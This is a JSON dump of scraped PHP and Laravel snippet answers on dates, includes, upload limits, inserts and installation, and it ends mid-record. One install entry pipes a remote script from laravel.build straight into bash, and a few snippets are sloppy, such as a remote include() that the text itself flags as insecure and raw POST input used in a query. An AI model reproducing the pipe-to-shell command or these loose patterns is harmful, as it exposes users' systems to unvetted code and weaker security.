    "description": "$time = strtotime(\"2010.12.11\"); $final = date(\"Y-m-d\", strtotime(\"+1 month\", $time));\necho Date(\"Y-m-d\", strtotime(\"2013-01-01 +1 Month -1 Day\"));// 2013-01-31  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +1 Month -3 Day\")); // 2013-02-28  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +2 Month\")); // 2013-03-31  echo Date(\"Y-m-d\", strtotime(\"2013-01-31 +3 Month -1 Day\")); // 2013-04-30  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -1 Month -1 Day\")); // 2013-11-30  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -2 Month\")); // 2013-10-31  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -3 Month\")); // 2013-10-01  echo Date(\"Y-m-d\", strtotime(\"2013-12-31 -3 Month -1 Day\")); // 2013-09-30\n$future_timestamp = strtotime(\"+1 month\"); $data = date('Y-m-d', $future_timestamp);\n<?php $months = n; // Here n = &hellip;..-2,-1,0,1,2, &hellip;..(months to add or subtract) $years = n;  // Here n = &hellip;..-2,-1,0,1,2, &hellip;..(years to add or subtract) echo date('Y-m-28', mktime(0, 0, 0, date('m')+$months, 1, date('Y') + $years)); ?>\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1864,
    "keyword": null,
    "link": null,
    "title": " in loop how add string by comma in php",
    "description": "//join string values by comma in loop $string = '';  foreach ($array as $key => $value) {     $string .= \",$value\"; }  $string = substr($string, 1); // remove leading \",\" //@sujay\n$values = \"\";  foreach ($stuffs as $stuff) {     $values != \"\" && $values .= \",\";     $values .= $stuff;  }  echo $values; //@sujay\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1865,
    "keyword": null,
    "link": null,
    "title": " in random order laravel",
    "description": "$galleries = App\\Gallery::inRandomOrder()->get(); //Or DB::table('gallery')->inRandomOrder()->get(); \nModel::select('column')->where('column','value')->inRandomOrder()     ->limit(2) // here is yours limit     ->get();  ------------------ OR --------------------  Model::inRandomOrder()->select('column')->where('column','value')->first();\nUser::all()->random(); User::all()->random(10); // The amount of items you wish to receive\n$randomUser = DB::table('users')                 ->inRandomOrder()                 ->first();\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1866,
    "keyword": null,
    "link": null,
    "title": " include a file in laravel controller",
    "description": "require_once __DIR__ . '/../app/Utilities/FileName.php';\nIf you have a custom file containing some classes/functions that need to be\\   loaded for every request, you need to make sure its added to the autoloader.  In your composer.json add the following in your autoload section:  \"autoload\": {   \"files\": [     \"path/to/your/File.php\"   ] }  OR    First, make sure you have a namespace declaration at the top of your included  file - say namespace Your\\Namespace. In order to avoid conflicts, you need  to explicitly tell PHP which class you mean when you reference it in the code. You mentioned your file contains a Response class that also exists in Laravel. In order to be able to use both, you need to alias one of them:  use Illuminate\\Http\\Response as LaravelResponse; use Your\\Namespace\\Response;\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1867,
    "keyword": null,
    "link": null,
    "title": " include a website in php file",
    "description": "Extremely insecure: <?php include(\"http://www.othersite.com/filename.html\"); ?>  What you probably want is: <?php print file_get_contents(\"http://www.othersite.com/filename.html\"); ?>\n<?php // do php stuff  include('fileOne.html'); include('fileTwo.html');  ?> \n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1868,
    "keyword": null,
    "link": null,
    "title": " include and require in php",
    "description": "// Include a file, if it can't be found: continue. <?php include 'mainfile.php'; ?>    // Alternatively: Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n// Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1869,
    "keyword": null,
    "link": null,
    "title": " include external php file in html",
    "description": "<!DOCTYPE html>  <html>   <head>   \t<title>External PHP File</title>   </head>   <body>   \t<?php include 'example.php';?>   <body> </html>\n/*You need to change that .html file to .php file. In this way,  you can easily link one php file to another.*/   <html> <body>  <h1>Welcome to my home page!</h1> <p>Some text.</p> <p>Some more text.</p> <?php include 'footer.php';?>  </body> </html>\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1870,
    "keyword": null,
    "link": null,
    "title": " include php",
    "description": "<?php \tinclude 'archive.php'; ?>\n// Include a file, if it can't be found: continue. <?php include 'mainfile.php'; ?>    // Alternatively: Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n<body> <?php      define('ROOT_PATH', dirname(__DIR__).'/');     include ROOT_PATH.'header.php';     include ROOT_PATH.'main.php';     include ROOT_PATH.'footer.php'; ?> </body>\n// Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n// Require a file to be imported or quit if it can't be found <?php  require 'somefile.php'; ?>    // Alternatively: Include a file, if it can't be found: continue. <?php include 'vars.php'; ?>\ninclude 'docName.php';\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1871,
    "keyword": null,
    "link": null,
    "title": " include php   DIR  ",
    "description": "PHP scripts run relative to the current path (result of getcwd()),  not to the path of their own file.  Using __DIR__ forces the include to happen relative to their own path. CORRECT: in file2.php: include (__DIR__ . \"/file3.php\"); To demonstrate: - file1.php - dir/    - file2.php    - file3.php If file2.php includes file3.php like this: include `file3.php`. It will work fine if you call file2.php directly.  However, if file1.php includes file2.php,  the current directory (getcwd()), will be wrong for file2.php,  so file3.php cannot be included.\n<?php include __DIR__ . \"/worker_2.php\";\n",
    "reg_date": "2021-10-12T10:15:15.000Z"
  },
  {
    "id": 1872,
    "keyword": null,
    "link": null,
    "title": " include string special in php",
    "description": " <?php $string = 'The lazy fox jumped over the fence';  if (str_contains($string, 'lazy')) {     echo \"The string 'lazy' was found in the string\\n\"; }  if (str_contains($string, 'Lazy')) {     echo 'The string \"Lazy\" was found in the string'; } else {     echo '\"Lazy\" was not found because the case does not match'; }  ?>  \n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1873,
    "keyword": null,
    "link": null,
    "title": " incorrect format parameter phpmyadmin xampp",
    "description": "upload_max_filesize=64M post_max_size=64M \nmax_execution_time = 5000 max_input_time = 5000 memory_limit = 1000M post_max_size = 750M upload_max_filesize = 750M \n1. Exceed PHP limits First of all, we start by checking the PHP parameters.  However, the exact location of the PHP configuration depends on the server we  are looking into. Let&rsquo;s discuss a few such types.  1. If it&rsquo;s WHM, then the config is located at WHM->Server configuration -> Tweak Settings.  2. For the Ubuntu server with Apache, it is in  /etc/php/{PHPversion}/apache2/php.ini.  3. If it&rsquo;s a local machine with Xammp: xampp/php/php.ini.  4. For Nginx webserver : /etc/php/{PHPversion}.  We change the following parameters based on requirements.  max_execution_time = 3000 max_input_time = 60 memory_limit = 128M post_max_size = 200M upload_max_filesize = 200M  We restart the apache service for the changes to reflect. If the issue still  persists, we further change the execution time limit in the phpmyadmin  configuration file. For WHM/cPanel it is generally located at  /usr/local/cpanel/base/3rdparty/phpMyAdmin/config.inc.php. Here again,  configuration file location may vary depending on the type of server.  reference: https://bobcares.com/blog/phpmyadmin-error-incorrect-format-parameter/\ndocker exec -it 34e sh -c \"echo 'php_value upload_max_filesize 256M' > '/var/www/html/.htaccess'\" docker exec -it 34e sh -c \"echo 'php_value post_max_size 256M' > '/var/www/html/.htaccess'\"\nCauses of phpMyAdmin error incorrect format parameter  We&rsquo;ll move on and find the possible reasons for the error.  From our expertise in managing servers, incorrect format parameter appears due  to multiple reasons such as:  1. Running a script more than the defined maximum execution time. 2. Similarly, if the requested data exceeds the defined limit. 3. The script may need more memory than the defined memory limit. 4. The size of post data goes higher than the defined maximum post data size. 5. Likewise, if the size of the backup file is more than defined maximum file  size. 6. Due to corrupted SQL.\n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1874,
    "keyword": null,
    "link": null,
    "title": " increament  single column laravel current value + 1",
    "description": "Product::increment('count' , 5); // count + 5  Product::decrement('count', 5); // count - 5  ---------------Or-----------------------    Product::where('product_id', $product->id)     ->update([       'count'=> DB::raw('count+1'),        'last_count_increased_at' => Carbon::now()     ]);\n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1875,
    "keyword": null,
    "link": null,
    "title": " increase execution size wp-config.php",
    "description": "set_time_limit(300);\n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1876,
    "keyword": null,
    "link": null,
    "title": " increase memory laravel controller",
    "description": "ini_set('memory_limit', '64M');\n1. Firstly i find which php.ini is working because i was using multiple xampp,   so using : php --ini 2. after that in that file i updated the memory_limit = -1    \n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1877,
    "keyword": null,
    "link": null,
    "title": " increase phpmyadmin upload limit cpanel",
    "description": "Increase upload size in PHPMYADMIN on cPanel server By default, phpmyadmin has a max upload size of 50 MiB. To increase this value on a cPanel server please do the following:  1. Login to WHM as root 2. Go to Server Configuration &raquo; Tweak Settings 3. Click on PHP tab 4. Update the values `max upload size` and `max POST size` to the max file size you need. 5. Don't forget to update `max execution time` to a proper value (in seconds) according to your upload speed to avoid getting the upload process fails if it takes a longer time than the value already set in `max execution time`. Save\n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1878,
    "keyword": null,
    "link": null,
    "title": " increase ssh timeout",
    "description": " ssh -o ServerAliveInterval=60 -i Firstme.pem ec2-user@3.90.84.197\n#Add these lines on sshd_config  ClientAliveInterval 120 ClientAliveCountMax 720 \n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1879,
    "keyword": null,
    "link": null,
    "title": " increase the 'post max size'",
    "description": "# php.ini  memory_limit=2048M post_max_size=512M upload_max_filesize=512M\n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1880,
    "keyword": null,
    "link": null,
    "title": " increase upload size wordpress",
    "description": "1. Update .htaccess file    php_value upload_max_filesize 128M   php_value post_max_size 128M   php_value memory_limit 256M   php_value max_execution_time 300   php_value max_input_time 300  Change the numbers to the values that you need. The max execution time and max  input time values are in seconds and might need to be increased further if  your internet connection is slow.  2. Update wp-config.php file    @ini_set( 'upload_max_filesize' , '128M' );   @ini_set( 'post_max_size', '128M');   @ini_set( 'memory_limit', '256M' );   @ini_set( 'max_execution_time', '300' );   @ini_set( 'max_input_time', '300' );  reference :  https://help.servmask.com/2018/10/27/how-to-increase-maximum-upload-file-size-in-wordpress/\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 \nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300\n// Increase Maximum Upload File Size @ini_set( 'upload_max_filesize' , '128M' ); //set this to a value > than your backup @ini_set( 'post_max_size', '128M'); //set this to a value > than your backup @ini_set( 'memory_limit', '256M' ); //set this to a value > than your backup @ini_set( 'max_execution_time', '300' ); //set this to 0 (infinite) @ini_set( 'max_input_time', '300' );\n",
    "reg_date": "2021-10-12T10:15:16.000Z"
  },
  {
    "id": 1881,
    "keyword": null,
    "link": null,
    "title": " increment single column laravel",
    "description": "Product::increment('count' , 5); // count + 5  Product::decrement('count', 5); // count - 5  ---------------Or-----------------------    Product::where('product_id', $product->id)     ->update([       'count'=> DB::raw('count+1'),        'last_count_increased_at' => Carbon::now()     ]);\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1882,
    "keyword": null,
    "link": null,
    "title": " index.php in codeigniter",
    "description": "<?php  #By default, the index.php file will be included in your URLs:    # Create a .htaccess file in your root folder and paste the below code  RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L] ?>\nRewriteEngine on RewriteCond $1 !^(index\\.php|resources|robots\\.txt) RewriteCond %{REQUEST_FILENAME} !-f RewriteCond %{REQUEST_FILENAME} !-d RewriteRule ^(.*)$ index.php/$1 [L,QSA] \n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1883,
    "keyword": null,
    "link": null,
    "title": " index.php wont load as main",
    "description": "Set index.php as Main      1. Create a .htaccess file in your root dir   2. Add the line...      DirectoryIndex index.php      3. Save it\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1884,
    "keyword": null,
    "link": null,
    "title": " indian time laravel",
    "description": "Go to your_project/config/app.php, there is a line: \t'timezone' => '' set it to: \t'timezone' => 'Asia/Kolkata'  It will set the default timezone to Asia/Kolkata. After setting this you will  get Indian time.  Here is the list of Supported Timezones https://www.php.net/manual/en/timezones.php\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1885,
    "keyword": null,
    "link": null,
    "title": " infinite cookie good php ?",
    "description": "setcookie(\"CookieName\", \"CookieValue\", 2147483647); \n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1886,
    "keyword": null,
    "link": null,
    "title": " infinite scroll php",
    "description": "<?php      $pageno = $_POST['pageno'];      $no_of_records_per_page = 10;     $offset = ($pageno-1) * $no_of_records_per_page;      $conn=mysqli_connect(\"localhost\",\"my_user\",\"my_password\",\"my_db\");     // Check connection     if (mysqli_connect_errno()){         echo \"Failed to connect to MySQL: \" . mysqli_connect_error();         die();     }      $sql = \"SELECT * FROM table LIMIT $offset, $no_of_records_per_page\";     $res_data = mysqli_query($conn,$sql);      while($row = mysqli_fetch_array($res_data)){          echo '<div>Demo'.$row[\"id\"].'</div>';      }      mysqli_close($conn);  ?>   <!DOCTYPE html> <html> <head>     <title>Infinite Scroll Demo</title>      <!-- JQuery CDN -->     <script src=\"https://code.jquery.com/jquery-3.3.1.min.js\"></script>      <!-- Inview Js (jquery.inview.js) -->     <script src=\"jquery.inview.js\"></script>      <style>         #response div{             border: 1px solid lightgrey;             height: 80px;             margin-bottom: 5px;             padding: 50px 0px 0px 0px;             text-align: center;         }         #loader{             display: block;             margin: auto;         }     </style> </head> <body>      <div id=\"response\">          <!-- response(next page's data) will get appended here -->          <!--we need to populate some initial data-->         <?php             $conn=mysqli_connect(\"localhost\",\"my_user\",\"my_password\",\"my_db\");             // Check connection             if (mysqli_connect_errno()){                 echo \"Failed to connect to MySQL: \" . mysqli_connect_error();                 die();             }             $sql = \"SELECT * FROM table LIMIT 5\";             $res_data = mysqli_query($conn,$sql);             while($row = mysqli_fetch_assoc($res_data)){                 echo '<div>Demo'.$row[\"id\"].'</div>';             }             mysqli_close($conn);         ?>     </div>       <input type=\"hidden\" id=\"pageno\" value=\"1\">      <img id=\"loader\" src=\"loader.svg\">      <script>          $(document).ready(function(){              $('#loader').on('inview', function(event, isInView) {                  if (isInView) {                      var nextPage = parseInt($('#pageno').val())+1;                      $.ajax({                          type: 'POST',                          url: 'pagination.php',                          data: { pageno: nextPage },                          success: function(data){                              if(data != ''){\t\t\t\t\t\t\t                                   $('#response').append(data);                                  $('#pageno').val(nextPage);                              } else {\t\t\t\t\t\t\t\t                                   $(\"#loader\").hide();                              }                          }                      });                  }              });          });      </script> </body> </html>\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1887,
    "keyword": null,
    "link": null,
    "title": " ini set('display errors' 'on') error reporting(e all)",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL); \ndisplay_errors = on \n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1888,
    "keyword": null,
    "link": null,
    "title": " inrandomorder laravel",
    "description": "$randomUser = DB::table('users')                 ->inRandomOrder()                 ->first();\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1889,
    "keyword": null,
    "link": null,
    "title": " insall laravel",
    "description": "composer global require laravel/installer  laravel new blog\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1890,
    "keyword": null,
    "link": null,
    "title": " insert an html page into php",
    "description": "<?php // do php stuff  include('fileOne.html'); include('fileTwo.html');  ?> \n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1891,
    "keyword": null,
    "link": null,
    "title": " insert batch in laravel",
    "description": "$data = [   ['name' => 'John', 'age' => 25],   ['name' => 'Maria', 'age' => 31],   ['name' => 'Julia', 'age' => 55], ]; DB::table('table_name')->insert($data);\n$data = array(     array('name'=>'Coder 1', 'rep'=>'4096'),     array('name'=>'Coder 2', 'rep'=>'2048'),     //... );  Coder::insert($data);\n",
    "reg_date": "2021-10-12T10:15:17.000Z"
  },
  {
    "id": 1892,
    "keyword": null,
    "link": null,
    "title": " insert data using model in laravel 8",
    "description": "mymodelname::insert([ \t'title' => 'mytitle' ]);\n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1893,
    "keyword": null,
    "link": null,
    "title": " insert date field automatically laravel",
    "description": "public $timestamps = true;\n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1894,
    "keyword": null,
    "link": null,
    "title": " insert form value into database php",
    "description": "/* PDO Class to connect to the database*/ /* Make sure you add the connect file which has the variable $connect */ $name \t  = $_POST[\"name\"]; $password = $_POST[\"password\"]; $stmt = $connect->prepare(\"INSERT INTO tablename(name, password) VALUES(:name, :pass)\"); $stmt->execute(array(   \"name\" => $name,   \"pass\" => $password )); /*    Check how to connect to the db using PDO    Type in google search: php how to connect to db using PDO   you will find the answer for this question posted by me */\n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1895,
    "keyword": null,
    "link": null,
    "title": " insert image in php",
    "description": "<body>  <?php      echo \"<img src='path/to/myphoto.jpg' alt='a photoe' />\";  ?>  </body>\n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1896,
    "keyword": null,
    "link": null,
    "title": " insert into wp table",
    "description": "global $wpdb; $table = $wpdb->prefix.'you_table_name'; $data = array('column1' => 'data one', 'column2' => 123); $format = array('%s','%d'); $wpdb->insert($table,$data,$format); $my_id = $wpdb->insert_id; \n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1897,
    "keyword": null,
    "link": null,
    "title": " insert key-value pair into array php",
    "description": "// If you are creating new array then try this : $arr = array(\"key\" => \"value\");  // And if array is already created then try this : $arr[\"key\"] = \"value\";\n// laravel  use Illuminate\\Support\\Arr;  $array = Arr::add(['name' => 'Desk'], 'price', 100);  // or this one:       $array = Arr::add($array, 'price', 100);   \n<?php $image[0] = $image[0].','.$filename; ?>\n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1898,
    "keyword": null,
    "link": null,
    "title": " insert multiple rows laravel",
    "description": "$array = [      ['value' => \"value1\", 'status_id' => 1],      ['value' => \"value2\", 'status_id' => 2] ];  ModelName::insert($array); // or DB::table('table_name')->insert($array);\n$data = [     ['user_id'=>'Coder 1', 'subject_id'=> 4096],     ['user_id'=>'Coder 2', 'subject_id'=> 2048],     //... ];  Model::insert($data); // Eloquent approach DB::table('table')->insert($data); // Query Builder approach \n/* It is really easy to do a bulk insert in Laravel with or without the query builder. You can use the following official approach. */   Entity::upsert([     ['name' => 'Pierre Yem Mback', 'city' => 'Eseka', 'salary' => 10000000],     ['name' => 'Dial rock 360', 'city' => 'Yaounde', 'salary' => 20000000],     ['name' => 'Ndibou La Menace', 'city' => 'Dakar', 'salary' => 40000000] ], ['name', 'city'], ['salary']);\n",
    "reg_date": "2021-10-12T10:15:18.000Z"
  },
  {
    "id": 1899,
    "keyword": null,
    "link": null,
    "title": " insert php variable css",
    "description": "a {   color: <?php echo $linkColor; ?>; }\n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1900,
    "keyword": null,
    "link": null,
    "title": " insert rows in migrations laravel",
    "description": "public function up() {     // Create the table     Schema::create('users', function($table){         $table->increments('id');         $table->string('email', 255);         $table->string('password', 64);         $table->boolean('verified');         $table->string('token', 255);         $table->timestamps();     });      // Insert some stuff     DB::table('users')->insert(         array(             'email' => 'name@domain.com',             'verified' => true         )     ); }\n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1901,
    "keyword": null,
    "link": null,
    "title": " insertgetid laravel 8",
    "description": "DB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n/** * The attributes that are mass assignable. * * @var array */ public function index() {     $id = User::insertGetId( \t        ['email' => 'john@example.com','name' => 'john'] \t    ); }\n/** * The attributes that are mass assignable. * * @var array */ public function index() { \t$id = DB::table('users')->insertGetId(             ['email' => 'john@example.com','name' => 'john']         ); }\n// Retrieve a model by its primary key... $flight = App\\Models\\Flight::find(1);  // Retrieve the first model matching the query constraints... $flight = App\\Models\\Flight::where('active', 1)->first();  // Shorthand for retrieving the first model matching the query constraints... $flight = App\\Models\\Flight::firstWhere('active', 1);\nDB::table('users')->where('name', Input::get('name'))->get(); \n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1902,
    "keyword": null,
    "link": null,
    "title": " instal phpgd2",
    "description": "sudo apt-get install php5-gd \n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1903,
    "keyword": null,
    "link": null,
    "title": " install all necessary php packages for laravel",
    "description": "sudo apt install openssl php-common php-curl php-json php-mbstring php-mysql php-xml php-zip\n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1904,
    "keyword": null,
    "link": null,
    "title": " install breeze",
    "description": "composer require laravel/breeze --dev  php artisan breeze:install  npm install npm run dev php artisan migrate  php artisan breeze:install react  npm install npm run dev php artisan migrate\n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1905,
    "keyword": null,
    "link": null,
    "title": " install composer without requirement",
    "description": "composer install --ignore-platform-reqs \n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1906,
    "keyword": null,
    "link": null,
    "title": " install jetstream",
    "description": "php artisan jetstream:install livewire  php artisan jetstream:install livewire --teams \ncomposer require laravel/jetstream \nlaravel new project-name --jet\n# follow the below link https://www.techiediaries.com/laravel-8-auth-scaffolding-jetstream-inertiajs-livewire/     \nphp artisan jetstream:install inertia  php artisan jetstream:install inertia --teams \n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1907,
    "keyword": null,
    "link": null,
    "title": " install laravel",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\nLaravel 8* install composer comand  composer create-project laravel/laravel .  php artisan serve\ncomposer global require \"laravel/installer\"\ncomposer global require laravel/installer  laravel new blog\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\nlaravel install on windows ----------------------------------- 1-composer install https://getcomposer.org/download/ 2-laravel install using composer composer global require laravel/installer 3-create new project laravel new blog cd blog  4-serve project to localhost php artisan serve \n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1908,
    "keyword": null,
    "link": null,
    "title": " install laravel 8 with composer",
    "description": "Laravel 8* install composer comand  composer create-project laravel/laravel example-app  cd example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel test \"8.*\"\ncomposer create-project --prefer-dist laravel/laravel ProjectName dev-develop\nlaravel install on windows ----------------------------------- 1-composer install https://getcomposer.org/download/ 2-laravel install using composer composer global require laravel/installer 3-create new project laravel new blog cd blog  4-serve project to localhost php artisan serve \ncurl -s https://laravel.build/app-name | bash <!-- OR --> composer create-project --prefer-dist laravel/laravel app-name \"8.*\"\n******************************************* *** SETTING UP LARAVEL 8 (Simple steps) *** *******************************************  **Ensure you computer already has PHP and Composer installed. Then apply the CLI commands below.  ** Vist \"https://www.apachefriends.org/index.html\" to install PHP via XAMPP ** Visit \"https://getcomposer.org/\" to install composer   ENTER CLI TERMINAL COMMANDS below ------------------------------------ > composer create-project laravel/laravel example-app  > cd example-app  > php artisan serve  > composer require laravel/ui  > php artisan ui vue --auth  Now you will have to ensure you setup your database variables in the  .env file of your laravel project so you can migrate your database.  > php artisan migrate  **At this stage, your laravel app is fully ready with  login authentication for development   DEPLOY APP TO ONLINE LINUX SERVER --------------------------------- [1] Delete the file called \"Server.php\" in the Laravel Project directory  [2] Copy your laravel 8 project to your web server \"Public_html\" directory  [3] Simply copy all files in the \"Public_html\" folder of your  Laravel 8 Project and paste in the server web home directory  which is the servers own 'Public_html' folder which is also where Laravel project files are.  [4] Then update the index.php file by changing the directory levels e.g. change '/../storage/framework/maintenance.php' to '/storage/framework/maintenance.php' by removing the '../' in the directory syntax. Thats all! just refresh your browser and your app will be running fine.    -- By Atsu Emmanuel T. (Web Developer / Architecht) Email: atsuemmanuel@gmail.com   \n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1909,
    "keyword": null,
    "link": null,
    "title": " install laravel auth",
    "description": "composer require laravel/ui php artisan ui vue --auth php artisan migrate \nset up auth laravel 7 ----------------- composer require laravel/ui:^2.4  php artisan ui vue --auth\n1 - composer create-project laravel/laravel laravel8 8.0 2 - composer require laravel/ui 3 - php artisan ui vue --auth 4 - npm install 5 - npm run dev 6 - php artisan ui:auth    7 = > url example.com/login  \nLaravel's laravel/ui package provides a quick way to scaffold all of the routes and views you need for authentication using a few simple commands:  composer require laravel/ui  php artisan ui vue --auth\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\ncomposer require laravel/ui \"^1.0\" --dev  php artisan ui vue --auth\n",
    "reg_date": "2021-10-12T10:15:19.000Z"
  },
  {
    "id": 1910,
    "keyword": null,
    "link": null,
    "title": " install laravel on windows",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\ncomposer global require \"laravel/installer\"\ncomposer global require laravel/installer  laravel new example-app  cd example-app  php artisan serve\nlaravel install on windows ----------------------------------- 1-composer install https://getcomposer.org/download/ 2-laravel install using composer composer global require laravel/installer 3-create new project laravel new blog cd blog  4-serve project to localhost php artisan serve \ncomposer global require \"laravel/installer=~1.1\"\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1911,
    "keyword": null,
    "link": null,
    "title": " install laravel passport",
    "description": "1 - composer require laravel/passport 2 - php artisan migrate 3 - php artisan passport:install 4 - go to user model   <?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Factories\\HasFactory; use Illuminate\\Foundation\\Auth\\User as Authenticatable; use Illuminate\\Notifications\\Notifiable; use Laravel\\Passport\\HasApiTokens;  class User extends Authenticatable {     use HasApiTokens, HasFactory, Notifiable; } ?>      5 - go to App\\Providers\\AuthServiceProvider   <?php  namespace App\\Providers;  use Illuminate\\Foundation\\Support\\Providers\\AuthServiceProvider as ServiceProvider; use Illuminate\\Support\\Facades\\Gate; use Laravel\\Passport\\Passport;  class AuthServiceProvider extends ServiceProvider {     /**      * The policy mappings for the application.      *      * @var array      */     protected $policies = [         'App\\Models\\Model' => 'App\\Policies\\ModelPolicy',     ];      /**      * Register any authentication / authorization services.      *      * @return void      */     public function boot()     {         $this->registerPolicies();          if (! $this->app->routesAreCached()) {             Passport::routes();         }     } }     ?>   7 - go to config/auth.php     'guards' => [     'web' => [         'driver' => 'session',         'provider' => 'users',     ],      'api' => [         'driver' => 'passport',         'provider' => 'users',     ], ],\nfor get client key in laravel passport run this command :  php artisan passport:client --personal\nphp artisan passport:install\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1912,
    "keyword": null,
    "link": null,
    "title": " install multiple php versions windows xampp",
    "description": "extension_dir = \"ext\"\nListen 8056 <VirtualHost *:8056>     <FilesMatch \"\\.php$\">         SetHandler application/x-httpd-php56-cgi     </FilesMatch> </VirtualHost>\n<VirtualHost localhost56:80>     DocumentRoot \"C:\\xampp\\htdocs56\"     ServerName localhost56     <Directory \"C:\\xampp\\htdocs56\">         Require all granted         </Directory>     <FilesMatch \"\\.php$\">         SetHandler application/x-httpd-php56-cgi     </FilesMatch> </VirtualHost>\nScriptAlias /php56 \"C:/xampp/php56\" Action application/x-httpd-php56-cgi /php56/php-cgi.exe <Directory \"C:/xampp/php56\">     AllowOverride None     Options None     Require all denied     <Files \"php-cgi.exe\">         Require all granted     </Files> </Directory>\n<Directory \"C:\\xampp\\htdocs\\my_old_project1\">     <FilesMatch \"\\.php$\">         SetHandler application/x-httpd-php56-cgi     </FilesMatch> </Directory>  <Directory \"C:\\xampp\\htdocs\\my_old_project2\">     <FilesMatch \"\\.php$\">         SetHandler application/x-httpd-php56-cgi     </FilesMatch> </Directory>\nSetEnv PHPRC \"\\\\path\\\\to\\\\xampp\\\\php\"\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1913,
    "keyword": null,
    "link": null,
    "title": " install php-mbstring in ubuntu",
    "description": "\tsudo apt-get install php7.2-mbstring   \t     sudo apt-get install libapache2-mod-php7.2 \t    \tsudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1914,
    "keyword": null,
    "link": null,
    "title": " install php7.4 in linux server",
